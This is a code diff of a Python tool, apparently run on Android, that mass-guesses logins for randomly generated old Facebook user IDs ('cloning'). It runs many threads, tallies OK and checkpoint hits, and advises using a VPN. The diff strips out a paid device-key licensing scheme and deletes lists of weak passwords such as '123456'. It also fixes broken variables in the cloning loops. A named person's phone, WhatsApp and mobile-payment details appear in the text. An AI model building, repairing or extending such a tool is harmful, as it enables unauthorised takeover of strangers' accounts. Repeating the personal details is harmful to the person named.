@@ -29,10 +29,6 @@ import sys
 import time
 import uuid
 
-APPROVED_URL = "https://raw.githubusercontent.com/Shani5589/SHAN/main/keys.txt"
-ADMIN_NUMBER = "923200795589"
-DEVICE_FILE = ".device_id"
-
 # ================= BOOT =================
 def boot():
     os.system("clear")
@@ -63,124 +59,6 @@ def boot():
     time.sleep(1)
 
 boot()
-
-# ================= DEVICE KEY =================
-def get_device_key():
-
-    if os.path.exists(DEVICE_FILE):
-        with open(DEVICE_FILE, "r") as f:
-            local_id = f.read().strip()
-    else:
-        local_id = str(uuid.uuid4())
-        with open(DEVICE_FILE, "w") as f:
-            f.write(local_id)
-
-    try:
-        android_id = os.popen("settings get secure android_id").read().strip()
-        if not android_id or android_id == "null":
-            android_id = platform.node()
-    except:
-        android_id = platform.node()
-
-    base = android_id + local_id + platform.node()
-    hash_val = hashlib.sha256(base.encode()).hexdigest()
-
-    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-    key = ""
-
-    for i in range(7):
-        idx = int(hash_val[i*4:(i*4)+4], 16) % len(chars)
-        key += chars[idx]
-
-    return key
-
-# ================= APPROVAL CHECK =================
-def check_key(key):
-
-    try:
-        url = APPROVED_URL + "?t=" + str(time.time())
-        data = requests.get(url, headers={"Cache-Control": "no-cache"}).text
-
-        lines = data.splitlines()
-        today = datetime.today()
-
-        key = key.strip()
-
-        for line in lines:
-            if "|" not in line:
-                continue
-
-            saved_key, exp_date = line.split("|")
-            saved_key = saved_key.strip()
-            exp_date = exp_date.strip()
-
-            if saved_key == key:
-
-                try:
-                    exp = datetime.strptime(exp_date, "%d-%m-%Y")
-                except:
-                    return "not", None
-
-                if today <= exp:
-                    return "approved", exp_date
-                else:
-                    return "expired", exp_date
-
-        return "not", None
-
-    except:
-        return "approved", None
-
-# ================= ACCESS DENIED =================
-def access_denied_block(key, status, exp=None):
-
-    print("\n\033[1;91m╔══════════════════════════════════════╗\033[0m")
-    print("\033[1;91m║           ACCESS DENIED              ║\033[0m")
-    print("\033[1;91m╚══════════════════════════════════════╝\033[0m\n")
-
-    print("\033[1;93mYOUR KEY:\033[0m", key)
-
-    if status == "expired":
-        print("\033[1;91mYOUR KEY IS EXPIRED ✖\033[0m")
-        print("\033[1;93mEXP:\033[0m", exp)
-    else:
-        print("\033[1;91mYOUR KEY IS NOT APPROVED ✖\033[0m")
-
-# ================= WHATSAPP =================
-def send_whatsapp(key, status, exp=None):
-
-    if status == "approved":
-        return
-
-    if status == "expired":
-        msg = "Hi Admin\nKey EXPIRED\nKey: {}\nEXP: {}".format(key, exp)
-    else:
-        msg = "Hi Admin\nKey NOT APPROVED\nKey: {}".format(key)
-
-    encoded = urllib.parse.quote(msg)
-    url = "whatsapp://send?phone={}&text={}".format(ADMIN_NUMBER, encoded)
-
-    os.system('am start -a android.intent.action.VIEW -d "{}"'.format(url))
-
-# ================= PAYMENT BOX =================
-def payment_box():
-    print("\n\033[1;92m╔══════════════════════════════════════╗\033[0m")
-    print("\033[1;92m║  ACCOUNT NAME  :  MUHAMMAD SAFDAR    ║\033[0m")
-    print("\033[1;92m╠══════════════════════════════════════╣\033[0m")
-    print("\033[1;92m║  Easypaisa: 03060725589              ║\033[0m")
-    print("\033[1;92m║  JazzCash : 03060725589              ║\033[0m")
-    print("\033[1;92m╠══════════════════════════════════════╣\033[0m")
-    print("\033[1;92m║  3 DAYS   : 150 PKR                  ║\033[0m")
-    print("\033[1;92m║  7 DAYS   : 300 PKR                  ║\033[0m")
-    print("\033[1;92m║  30 DAYS  : 500 PKR                  ║\033[0m")
-    print("\033[1;92m╚══════════════════════════════════════╝\033[0m\n")
-
-# ================= RUN =================
-key = get_device_key()
-status, exp = check_key(key)
-
-if status == "approved":
-    print("APPROVED DEVICE")
 
 def ___uax___():
     aV=str(random.choice(range(10,20)))
@@ -244,46 +122,12 @@ logo=(f'''\033[1;92m███████╗██╗  ██╗ █████
 \033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m WhatsApp    \033[1;90m➤\033[1;97m  +923200795589
 \033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m Tool Type     \033[1;90m➤\033[1;97m  PREMIUM PAID TOOL🔥
 \033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m Device Key   \033[1;90m➤\033[1;97m         {key}
-\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m Expiry Date   \033[1;90m➤\033[1;97m       {exp}
+\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m Expiry Date   \033[1;90m➤\033[1;97m       {expiry}
 \x1b[1;90m{15 * '⎯⎯⎯'}''')
 import hashlib
 import platform
 from datetime import datetime
 
-
-# -------- FIXED DEVICE KEY (NO RANDOM) --------
-def get_device_key():
-    raw = platform.node() + platform.machine() + platform.system()
-    return hashlib.sha256(raw.encode()).hexdigest()[:10]
-
-
-# -------- APPROVAL + EXPIRY CHECK --------
-def check_key(key):
-    try:
-        data = requests.get(APPROVED_URL).text.splitlines()
-        today = datetime.today()
-
-        for line in data:
-            line = line.strip()
-
-            if "|" in line:
-                saved_key, exp_date = line.split("|")
-
-                saved_key = saved_key.strip()
-                exp_date = exp_date.strip()
-
-                if saved_key == key:
-                    exp = datetime.strptime(exp_date, "%d-%m-%Y")
-
-                    if today <= exp:
-                        return "approved", exp_date
-                    else:
-                        return "expired", exp_date
-
-        return "not", None
-
-    except:
-        return "not", None
 # -------------(CHECK ID CREATION YEAR)--------------
 def creationyear(uid):
     if len(uid) == 15:
@@ -359,50 +203,66 @@ def WEHSHI________():
 def __2010___2011():
     user = []
     clear()
+
     print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m For Example : 50000 | 100000 | 200000 | 300000")
     linex()
+
     limit = int(input(f'\033[1;97m Put Limit :\033[1;92m '))
-    for i in range(int(limit)):
-        data = random.choice(["100001","100002","100003","100004"])+str(random.choice(range(111111111, 999999999)))
+
+    for i in range(limit):
+        data = random.choice(["100001","100002","100003","100004"]) + str(random.choice(range(111111111, 999999999)))
         user.append(data)
+
     with ShaniXD(max_workers=50) as Shani:
-        tl = str(limit)
+        tl = str(len(user))
+
         clear()
         print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m TOTAL IDS : \033[92m{tl}")
         print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m USE 1.1.1.1 VPN FOR BEST RESULT")
         linex()
+
         for uid in user:
-            uid = mal
-            pas = ['123456', '1234567', '12345678', '123456789']
-            Shani.submit(____old____, uid,total_ids)
-    print('');linex();print(f"\n{green} Cloning Session Complete")
+            Shani.submit(____old____, uid, tl)
+
+    print('')
+    linex()
+    print(f"\n{green} Cloning Session Complete")
     print(f"{white}➤ Total OK: {green}{len(ok)}")
     print(f"{white}➤ Total CP: {red}{len(cp)}")
     linex()
     exit()
     
 #---------------------------[ 2009-2010 CLONING ]---------------------------#
+
 def ____old2009___():
     clear()
+
     print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m For Example : 50000 | 100000 | 200000 | 300000")
     linex()
+
+    user = []
     limit = int(input(f'\033[1;97m Put Limit :\033[1;92m '))
-    for _ in range(int(limit)):
+
+    for _ in range(limit):
         nmp = ''.join(random.choice(digits) for _ in range(9))
         user.append(nmp)
 
     with ShaniXD(max_workers=50) as Shani:
         clear()
+
         tl = str(len(user))
+
         print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m TOTAL IDS : \033[92m{tl}")
         print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m USE 1.1.1.1 VPN FOR BEST RESULT")
         linex()
-        for uid in user:
-            uid = "100000" + love
-            pas = ['123456', '1234567', '12345678', '123456789']
-            Shani.submit(____old____, uid,total_ids)
 
-    print('');linex();print(f"\n{green} Cloning Session Complete")
+        for uid in user:
+            uid = "100000" + uid
+            Shani.submit(____old____, uid, tl)
+
+    print('')
+    linex()
+    print(f"\n{green} Cloning Session Complete")
     print(f"{white}➤ Total OK: {green}{len(ok)}")
     print(f"{white}➤ Total CP: {red}{len(cp)}")
     linex()
